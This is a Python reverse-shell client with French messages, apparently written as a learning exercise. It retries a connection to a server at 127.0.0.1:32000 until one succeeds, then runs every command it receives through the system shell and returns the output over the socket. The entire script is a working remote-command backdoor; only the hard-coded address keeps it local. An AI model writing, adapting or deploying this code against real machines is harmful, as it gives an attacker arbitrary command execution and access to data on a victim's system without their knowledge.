
import socket
import time
import subprocess
import platform
import os

HOST_IP = "127.0.0.1"
HOST_PORT = 32000
MAX_DATA_SIZE = 1024

print(f"Connexion au serveur {HOST_IP}, port {HOST_PORT}")
while True:
    try:
        s = socket.socket()
        s.connect((HOST_IP, HOST_PORT))
    except ConnectionRefusedError:
        print("ERREUR : impossible de se connecter au serveur. Reconnexion...")
        time.sleep(4)
    else:
        print("Connecté au serveur")
        break

# ....
while True:
    commande_data = s.recv(MAX_DATA_SIZE)
    if not commande_data:
        break
    commande = commande_data.decode()
    print("Commande : ", commande)

    if commande == "infos":
        reponse = platform.platform() + " " + os.getcwd()
    else:
        resultat = subprocess.run(commande, shell=True, capture_output=True, universal_newlines=True)
        reponse = resultat.stdout + resultat.stderr

        if not reponse or len(reponse) == 0:
            reponse = " "

    header = str(len(reponse.encode())).zfill(13)
    print("header:", header)
    s.sendall(header.encode())
    s.sendall(reponse.encode())
    
    # handshake

s.close()
